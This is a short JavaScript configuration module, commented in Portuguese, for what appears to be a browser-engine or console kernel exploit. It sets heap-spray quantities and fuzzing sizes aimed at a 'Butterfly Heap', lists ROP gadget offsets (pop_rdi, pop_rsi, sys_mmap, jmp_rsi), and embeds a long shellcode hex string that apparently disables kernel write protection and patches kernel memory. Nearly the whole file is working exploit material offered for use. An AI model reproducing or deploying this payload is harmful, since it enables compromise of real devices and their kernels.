export const CONFIG = {
    // Limite de segurança (Mantido)
    WORKER_LIMIT: 402,
    
    // Quantidade de sprays (Aumentamos para garantir cobertura no Butterfly Heap)
    SPRAY_QUANTITY: 15000,

    // Tamanhos para o Fuzzer
    // Arrays nativos têm headers de 16 bytes.
    // Testamos tamanhos alinhados e levemente desalinhados.
    SIZES_TO_TEST: [
        0x90, 0xA0, 0xB0, // Pequenos
        0x100, 0x120, 0x140, 
        0x200, 0x220, 0x240,
        0x400, 0x420, // Médios (Favoritos)
        0x800, 0x820,
        0x1000, 0x2000, 0x4000
    ]
};

// Mantenha os GADGETS e SHELLCODE iguais...
export const GADGETS = {
    pop_rdi: 0x2FEB5n,
    pop_rsi: 0x2B89Fn,
    sys_mmap: 0x7500n,
    jmp_rsi: 0x47b31n
};
export const SHELLCODE_HEX = "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb000000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3";
